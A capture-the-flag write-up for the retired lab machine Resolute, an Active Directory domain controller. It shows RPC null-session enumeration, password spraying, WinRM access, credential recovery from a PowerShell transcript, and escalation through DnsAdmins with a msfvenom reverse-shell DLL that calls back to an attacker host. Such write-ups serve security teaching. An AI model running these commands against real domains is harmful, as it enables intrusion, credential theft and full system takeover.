# Resolute

This is the write-up for the box Resolute that got retired at the 30th May 2020.
My IP address was 10.10.14.15 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.169    resolute.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/resolute.nmap 10.10.10.169
```

```
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-03-22 17:10:25Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

This box seems to be an **Active Directory domain controller** and the hostname _megabank.local_ should be put into the _/etc/hosts_ file.

## Checking RPC (Port 135)

Checking if RPC is configured to accept **null authentication**:
```
rpcclient -U '' 10.10.10.169
```

Without entering a password, authentication to the RPC client works and can be used to enumerate valuable information.

List all users and create a wordlist with them:
```
rpcclient $> enumdomusers

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
(...22 more users...)
```

Enumerating the attributes of the users:
```
rpcclient $> querydispinfo

(...)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
(...)
```

The user _marko_ has a password in the description attribute, so lets test if it works:
```
crackmapexec smb 10.10.10.169 -u marko -p 'Welcome123!'
```

It does not authenticate but as this looks like a default password that is given to new users, it can be tried out on every user with a **Password Spraying attack**:
```
crackmapexec smb 10.10.10.169 -u users.list -p 'Welcome123!'
```

There was one successful hit and the password works on the user _melanie_.

Testing if this user has permission to use **Windows Remoting**:
```
crackmapexec winrm 10.10.10.169 -u melanie -p 'Welcome123!'
```

The user _melanie_ has permission to start a **WinRM** connection:
```
evil-winrm -u melanie -p 'Welcome123!' -i 10.10.10.169
```

This starts a shell session on the box as _melanie_.

## Privilege Escalation

To get an attack surface on the box, it is recommended to run any **Windows Enumeration script**:
```
curl 10.10.14.15:8000/winPEAS.exe -o winPEAS.exe

.\winPEAS.exe
```

In the domain there is a non-default group _Contractors_ that is a member of the _DNS Administrators Group_.
Enumerating who is a member of that group with **rpcclient**:
```
rpcclient $> enumdomgroups

(...)
group:[Contractors] rid:[0x44f]
```
```
rpcclient $> querygroupmem 0x44f

rid:[0x451] attr:[0x7]
```
```
rpcclient $> queryuser 0x451

User Name   :   ryan
Full Name   :   Ryan Bertrand
(...)
```

The user _ryan_ is a member of these groups and thus is a high value target.

There is an interesting hidden directory and hidden file in _C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt_ that can only be seen with the `dir -hidden` parameter.
This file is a PowerShell logging transcript that logs all commands that were ran and the following information in there is useful:
```
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
(...)
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
(...)
```

The logging transcript was created by the user _ryan_ and this user mounted a file share by using credentials directly in the command line.
Lets start a **WinRM** connection with _ryan_:
```
evil-winrm -u ryan -p 'Serv3r4Admin4cc123!' -i 10.10.10.169
```

### Privilege Escalation to Administrator

As we found out, the user _ryan_ is a member of _DNS Administrators Group_.
Members of this group have the ability to load **DLL files** from network paths to execute arbitrary code as explained in [several articles](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2).

Creating a malicious DLL with **Msfvenom**:
```
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.15 LPORT=9001 -f dll > shell.dll
```

Hosting the file on a SMB server:
```
impacket-smbserver testshare $(pwd)
```

Using `dnscmd` to inject the DLL file into the DNS process:
```
dnscmd.exe 127.0.0.1 /config /serverlevelplugindll \\10.10.14.15\testshare\shell.dll
```

Restarting the DNS process:
```
sc.exe stop dns

sc.exe start dns
```

After restarting the process, the DLL gets executed and the listener on my IP and port 9001 starts a reverse shell as _NT Authority\SYSTEM_!
